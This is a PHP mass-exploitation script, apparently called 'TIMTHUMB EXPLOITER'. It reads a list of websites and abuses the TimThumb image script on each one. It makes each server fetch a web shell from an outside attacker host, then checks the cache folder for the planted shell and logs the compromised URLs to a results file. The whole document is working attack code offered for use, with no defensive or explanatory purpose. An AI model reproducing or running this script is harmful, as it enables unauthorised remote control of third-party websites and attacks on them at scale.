<?php
#TIMTHUMB EXPLOITER 
#AUTHR BY : HERMAN GANS
#NOTICE : HARGAI AUTHOR YA ANJG, DENGAN LO GONTA GANTI TEXT G BUATLO JADI HEBAT!
#Usage : php bot.php list.txt

system('clear');
require('header.php');

$url=file($argv[1]);
foreach ($url as $sites){
  if(preg_match("@http://@", $sites) AND preg_match("@https://@",$sites)){
        $sites = $sites;
    }else{
        $sites = $sites;
    }
 
$sites=trim($sites);
$exploit = "/admin/timthumb.php";
$payload = "?src=http://flickr.com.abaykan.com/shell.php"; 
$shell = "6fbaee0ee4fa6a9712d7ed6d1ba70da8.php";
$getshell = "$sites/admin/cache/$shell";
$upload = "$sites$exploit$payload";
$count = count($url);
  
echo "Exploiting : $sites\n";
  
//curl
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $upload);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$output = curl_exec($ch);

if($output){
  $cek = curl_init();
  curl_setopt($cek, CURLOPT_URL, $getshell);
	curl_setopt($cek, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($cek, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($cek, CURLOPT_CONNECTTIMEOUT, 60);
  curl_setopt($cek, CURLOPT_TIMEOUT, 60);
  curl_setopt($cek, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0");
  $response = curl_exec($cek);
  $httpcode = curl_getinfo($cek, CURLINFO_HTTP_CODE);
  
  if(preg_match("/GIF89a;/", $response)){
	 echo "\033[92m$getshell [SHELL FOUND]\n\n";
   $save = @fopen("result.txt", "a");
   fwrite($save, $getshell."\n");
   fclose($save);
  }
    else{
      echo "\033[91m$getshell [SHELL NOT FOUND]\n\n";
    }
  }
  echo "\033[97m";
}
echo "\033[97mTotal Target : $count\n";
?>